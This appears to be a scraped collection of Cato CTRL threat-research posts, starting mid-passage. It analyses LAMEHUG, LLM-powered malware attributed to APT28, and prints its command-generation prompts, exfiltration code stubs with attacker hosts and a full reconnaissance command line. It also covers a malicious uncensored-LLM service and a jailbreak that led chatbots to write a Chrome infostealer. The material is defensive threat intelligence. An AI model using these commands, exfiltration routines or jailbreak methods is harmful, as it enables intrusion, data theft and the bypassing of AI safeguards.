with one of the people operating the Telegram channel and the Nytheon AI platform. Cato CTRL assesses with high confidence that it’s a Russian-speaking individual from a post-Soviet country based on the dialect used.\nSecurity Best Practices\nStrengthen Threat Detection and Response\n- Use Cato XDR with integrated behavioral analytics and UEBA to detect anomalies and never-before-seen threats using machine learning (ML) models.\n- Leverage Cato XDR to automatically correlate signals from network, cloud, and remote users — critical when phishing lures or fast-mutating malware target multiple surfaces in parallel.\nImplement Stronger Access Controls\n- Enforce Cato Universal ZTNA to limit lateral movement and isolate compromised credentials with continuous device posture checks and risk-aware policies.\n- Apply least privilege access and multi-factor authentication (MFA) using Cato’s identity-aware routing, enabling fine-grained access policies based on user identity, role, and context to reduce attack surface.\nEnhance Security Awareness and Training\n- Conduct phishing simulations crafted with GenAI to mimic tone-perfect, context-aware lures.\n- Monitor usage of GenAI tools in the enterprise through Cato CASB’s shadow AI dashboard, helping IT teams identify risky or unauthorized behavior.\n- Use Cato’s threat insights and real-time traffic analysis to enhance internal security drills and incident response planning.\n- Complement Cato’s visibility with third-party developer training and CI/CD security tools to address GenAI coding risks.\nConclusion\nThe Nytheon AI platform demonstrates that with open-source LLMs, a jailbreak prompt, and a handful of cloud-native microservices, a threat actor can deploy a GenAI-as-a-service operation. Rather than simply offering access to a single uncensored LLM, threat actors are now offering multiple uncensored LLMs in a single platform capable of conducting a variety of attacks including tailored spear-phishing campaigns, polymorphic malware, deepfake documents, and turnkey API-driven attacks.\nFor defenders, the challenge is no longer just about blocking the Nytheon AI platform itself. It’s about absorbing the volume and variety of artifacts the platform can rapidly mass-produce. The defensive strategy must therefore emphasize visibility, control, and human readiness. By implementing this defensive strategy, enterprises can minimize the Nytheon AI threat."
    },
    {
      "url": "https://www.catonetworks.com/blog/cato-ctrl-threat-research-analyzing-lamehug/",
      "text": "Cato CTRL™ Threat Research: Analyzing LAMEHUG – First Known LLM-Powered Malware with Links to APT28 (Fancy Bear)\n|\nListen to post:\nGetting your Trinity Audio player ready...\n|\nExecutive Summary\nOn July 17, 2025, Ukraine’s Computer Emergency Response Team (CERT-UA) publicly reported LAMEHUG, which is being documented as the first known malware that integrates large language model (LLM) capabilities directly into its attack methodology.\nKey Facts:\n- Discovery Date: July 10, 2025\n- Attribution: APT28 (Fancy Bear) with moderate confidence, according to CERT-UA.\n- Target: Ukrainian government officials.\n- Attack Vector: Phishing emails impersonating Ukrainian ministry officials and containing ZIP archives with PyInstaller-compiled Python executables.\n- Technical Innovation: Malware uses LLM Qwen2.5-Coder-32B-Instruct for real-time command generation. Our analysis is that APT28 used approximately 270 Hugging Face tokens for authentication.\n- Assessment: Proof-of-concept (PoC) exploration of LLM integration in state-sponsored cyber operations.\nTechnical Overview\nInitial Discovery and Distribution\nThe LAMEHUG campaign began when CERT-UA received reports about suspicious email distribution among Ukrainian government officials. The emails appeared to be sent from representatives of relevant ministries, containing an attachment named “Додаток.pdf.zip” (Attachment.pdf.zip).\nLLM Integration\nLAMEHUG’s defining characteristic is its integration of AI for dynamic attack generation. According to CERT-UA’s alert, the malware “uses the LLM Qwen2.5-Coder-32B-Instruct via the huggingface[.]co service API to generate commands based on statically entered text (description) for their subsequent execution on a computer.”\nLAMEHUG Variants\nThe ZIP archive contained an executable file with a “.pif” extension, which was converted from Python source code using PyInstaller. CERT-UA discovered multiple variants of the LAMEHUG malware:\n- Додаток.pif (Attachment.pif)\n- save_document.py\n- AI_generator_uncensored_Canvas_PRO_v0.9.exe\n- AI_image_generator_v0.95.exe\n- image.py\nThese variants demonstrated functional differences in data exfiltration methods, indicating ongoing development and adaptation of the malware family.\nReverse Engineering: The Actual Prompts\nOur analysis of the malware samples revealed the exact prompts being sent to the LLM. The malware uses base64-encoded prompts to obscure its intentions.\nFigure 1. Додаток.pif.pdf (Attachment.pif.pdf) that the user sees while the malware is being executed\nPrompt Analysis of Додаток.pif Variant\nFigure 2. Додаток.pif prompts that are being sent to the Qwen2.5-Coder-32B-Instruct model (example #1)\nFigure 3. Додаток.pif prompts that are being sent to the Qwen2.5-Coder-32B-Instruct model (example #2)\nFigure 4. Додаток.pif prompts that are being sent to the Qwen2.5-Coder-32B-Instruct model (example #3)\nThe Додаток.pif variant uses two specific prompts:\n- System Information Gathering Prompt: “Make a list of commands to create folder C:\\Programdata\\info and to gather computer information, hardware information, process and services information, networks information, AD domain information, to execute in one line and add each result to text file c:\\Programdata\\info\\info.txt. Return only commands, without markdown.”\n- Document Harvesting Prompt: “Make a list of commands to copy recursively different office and pdf/txt documents in user Documents, Downloads and Desktop folders to a folder c:\\Programdata\\info\\ to execute in one line. Return only command, without markdown.”\nPrompt Analysis of AI Image Generator Variants\nFigure 5. image.py prompts that are being sent to the Qwen2.5-Coder-32B-Instruct model\nThe AI image generator variants (AI_generator_uncensored_Canvas_PRO_v0.9.exe and AI_image_generator_v0.95.exe) use a provocative image generation prompt as a lure:\n“Curvy naked woman sitting, long beautiful legs, front view, full body view, visible face.”\nThese variants contact the Flux AI image generator API (https://router.huggingface.co/nebius/v1/images/generations) while simultaneously executing the same data collection and exfiltration routines in the background.\nMalware Operation Flow\nBased on our analysis, LAMEHUG operates through the following process:\n- Prompt Generation: The malware contains pre-defined, base64-encoded text descriptions of desired attack objectives.\n- API Communication: The malware sends these prompts to the Qwen2.5-Coder-32B-Instruct model via Hugging Face’s API using approximately 270 tokens for authentication.\n- Command Generation: The LLM responds with executable command sequences tailored to the requested objective.\n- Real-Time Execution: The malware immediately executes the AI-generated commands on the target system.\nExfiltration Methods\nThe malware implements two different exfiltration methods depending on the variant.\nSFTP Exfiltration (image.py variant)\ndef ssh_send(path):\naddress = '144[.]126[.]202[.]227'\nport = 22\nusername = 'upstage'\npassword = 'upstage'\ntarget_path = '/tmp/upl/'\n# [SFTP upload logic]\nHTTP POST Exfiltration (Додаток.pif variant)\ndef send(path):\nurl = 'https[:]//stayathomeclasses[.]com/slpw/up[.]php'\n# [HTTP POST upload logic]\nLLM-Generated Command Analysis\nCERT-UA documented the actual command sequence generated by the LLM integration, demonstrating the sophisticated reconnaissance capabilities achieved through dynamic AI generation.\ncmd.exe /c \"mkdir %PROGRAMDATA%\\info && systeminfo >> %PROGRAMDATA%\\info\\info.txt && wmic computersystem get name,manufacturer,model >> %PROGRAMDATA%\\info\\info.txt && wmic cpu get name,speed >> %PROGRAMDATA%\\info\\info.txt && wmic memorychip get capacity,speed >> %PROGRAMDATA%\\info\\info.txt && wmic diskdrive get model,size >> %PROGRAMDATA%\\info\\info.txt && wmic nic get name,macaddress,ipaddress >> %PROGRAMDATA%\\info\\info.txt && tasklist >> %PROGRAMDATA%\\info\\info.txt && net start >> %PROGRAMDATA%\\info\\info.txt && ipconfig /all >> %PROGRAMDATA%\\info\\info.txt && whoami /user >> %PROGRAMDATA%\\info\\info.txt && whoami /groups >> %PROGRAMDATA%\\info\\info.txt && net config workstation >> %PROGRAMDATA%\\info\\info.txt && dsquery user -samid %username% >> %PROGRAMDATA%\\info\\info.txt && dsquery computer -name %COMPUTERNAME% >> %PROGRAMDATA%\\info\\info.txt && dsquery group >> %PROGRAMDATA%\\info\\info.txt && dsquery ou >> %PROGRAMDATA%\\info\\info.txt && dsquery site >> %PROGRAMDATA%\\info\\info.txt && dsquery subnet >> %PROGRAMDATA%\\info\\info.txt && dsquery server >> %PROGRAMDATA%\\info\\info.txt && dsquery domain >> %PROGRAMDATA%\\info\\info.txt\"\nThis comprehensive command sequence demonstrates the LLM’s ability to generate extensive system reconnaissance commands that collect:\n- Hardware and System Information: wmic, systeminfo\n- Running Processes and Services: tasklist, net start\n- Network Configuration Details: ipconfig, wmic nic\n- User and Group Information: whoami, dsquery\n- Complete Active Directory (AD) Structure Enumeration: full use of dsquery\nAttribution Assessment: APT28 Testing New Capabilities\nCERT-UA attributes the LAMEHUG campaign to APT28 (Fancy Bear) with moderate confidence. APT28 is associated with Russia’s Main Intelligence Directorate (GRU) Unit 26165.\nWhy This Appears to Be PoC Testing\nBased on our analysis of the actual malware code and operational characteristics, several factors suggest APT28 is testing new LLM capabilities rather than executing a sophisticated operational deployment:\n- Code Simplicity: The Python scripts are relatively basic, lacking the sophisticated evasion techniques typically associated with APT28 operations.\n- Obvious AI Integration: The LLM integration is implemented straightforwardly without attempts to obfuscate or hide the AI service usage.\n- Limited Operational Security: The use of easily identifiable prompts and legitimate AI services without advanced masking techniques.\n- Testing Ground: Ukraine has historically served as a testing ground for Russian cyber capabilities, making it an ideal location for PoC deployments.\n- Multiple Variants: The presence of different variants with varying exfiltration methods suggests experimentation with various approaches.\nDetection Challenges for Traditional Security Solutions\nLAMEHUG introduces fundamental challenges for traditional cybersecurity approaches:\n- Signature-based detection fails due to dynamic command generation.\n- Network traffic appears legitimate (AI API usage).\n- Behavioral analysis requires new methodologies specific to LLM-powered threats.\nSecurity Best Practices\nShadow AI (Visibility and Control)\nThe most critical protection against LAMEHUG-style threats is controlling AI access:\n- Enforce Approved LLMs Only: Define which generative AI (GenAI) applications users can access and exactly what actions are allowed (upload, download, etc.).\n- Real-Time Data Protection: Limit or prevent sensitive data from being uploaded to LLMs, avoiding data security and confidentiality violations in real-time.\n- Comprehensive Visibility: Monitor all GenAI usage across the organization with a catalog of 950+ GenAI applications from Cato CASB.\nNetwork-Level Protection\n- ML-Powered Malware Detection: Cato NGAM uses ML algorithms to detect zero-day and polymorphic malware.\n- DNS Security: DNS protection integrated into Cato IPS analyzes DNS queries and responses to block malicious domains.\n- Application Control: Monitor and control access to cloud services and APIs, with specific focus on AI platforms.\nExtended Detection and Response\nWith Cato XDR, organizations can enable:\n- AI/ML Threat Hunting: Continuous ML-based threat hunting and UEBA baseline for every user, host, and app—detecting stealthy malware or anomalous behavior that bypasses preventive controls.\n- Smart Investigation: Automatic incident correlation with dynamic risk scoring, displayed in a pivot-enabled analyst workbench for quick deep dives from high-level “Story” to raw flows and logs.\n- One-Click Response: Built-in remediation enables security analysts to quarantine hosts, deploy new SDP/firewall rules, or trigger endpoint actions instantly—all from a single console.\nLateral Movement Protection\n- Lateral Movement: Cato IPS provides detection, discovery and blocking of lateral movement patterns and indicators, preventing malware propagation across the WAN.\nZero Trust Network Access\n- Microsegmentation: Cato Universal ZTNA allows organizations to segment their networks into smaller parts with software-defined security perimeters that limit lateral movement.\nConclusion\nThe discovery of LAMEHUG by CERT-UA marks a significant milestone in the threat landscape. While this campaign appears to be a PoC test by APT28 (Fancy Bear), it signals the beginning of a new era where AI is directly incorporated into malware operations. The campaign highlights state-sponsored investment in emerging AI technologies for cyber activities, with Ukraine serving as the testing ground for these new capabilities. The relatively simple implementation suggests this is APT28’s attempt at learning how to weaponize LLMs, likely opening the door for more sophisticated AI-driven campaigns in the future.\nOrganizations that leverage a SASE platform, such as the Cato SASE Cloud Platform, are better positioned to defend against emerging AI-powered threats through integrated security controls, behavioral analysis, and advanced threat prevention capabilities. As threat actors continue to evolve their tactics to include AI technologies, security platforms must evolve to provide AI-aware protection mechanisms.\nIndicators of Compromise (IoCs)\nFile Indicators\nNetwork Infrastructure\nCommand and Control:\n- 144[.]126.202.227 (SFTP server for data exfiltration)\n- stayathomeclasses[.]com (compromised hosting resource)\n- https://stayathomeclasses[.]com/slpw/up.php (exfiltration endpoint)\nDistribution:\n- boroda70@meta[.]ua (compromised email account)\n- 192[.]36.27.37 (email sending infrastructure via LeVPN)\nLLM API Endpoints:\n- https[:]//router[.]huggingface.co/hyperbolic/v1/chat/completions\n- https[:]//router[.]huggingface.co/nebius/v1/images/generations\nHost-Based Artifacts\n- %PROGRAMDATA%\\info\\ (data staging directory)\n- %PROGRAMDATA%\\info\\info.txt (system information collection file)\n- %PROGRAMDATA%\\Додаток.pdf (decoy document)"
    },
    {
      "url": "https://www.catonetworks.com/resources/2025-cato-ctrl-threat-report-rise-of-zero-knowledge-threat-actor/",
      "text": "The Rise of the Zero-Knowledge Threat Actor\nWhat’s inside the report:\n- Cato CTRL develops new LLM jailbreak technique called “Immersive World”: Bypassed security controls in DeepSeek, Microsoft Copilot, and OpenAI’s ChatGPT, convincing them to write malware for Google Chrome.\n- GenAI security controls fail: All three GenAI tools tricked into normalizing restricted operations with narrative engineering.\n- The rise of the zero-knowledge threat actor: No malware coding expertise needed to create a fully functional Chrome infostealer.\n- Traditional security strategies aren’t enough: The democratization of cybercrime demands proactive AI security strategies.\n- AI hype increases AI adoption—and risk: Trends in AI application adoption, the industries using them, and a summary of security risks for top AI applications.\nSummary:\nA threat intelligence researcher from Cato CTRL, the Cato Networks threat intelligence team, successfully bypassed security controls in ChatGPT, Copilot, and DeepSeek—the GenAI models that enterprises are using to improve workflow efficiency.\nBy developing a new LLM jailbreak technique, all three tools were tricked into creating malware that steals login credentials from Chrome. The researcher had no prior malware coding expertise—just a cleverly crafted narrative that fooled every security guardrail.\nCybercrime isn’t limited to skilled threat actors anymore. With basic tools, anyone can launch an attack. For CIOs, CISOs, and IT leaders, this means more threats, greater risks, and the need for stronger AI security strategies."
    }
  ],
  "argos_summary": "Russia's APT28 has been identified as the first group to deploy LLM-powered malware, named LAMEHUG, against Ukraine, utilizing stolen Hugging Face API tokens for real-time command generation. This malware, which operates through phishing emails, exemplifies a new era of AI warfare, allowing even those without coding expertise to create sophisticated attacks using consumer AI tools. The emergence of platforms like Nytheon AI, which offers uncensored LLM capabilities for malicious purposes, highlights the growing threat landscape where basic access to AI tools can facilitate cybercrime.",
  "argos_id": "O5L1IPM9B"
}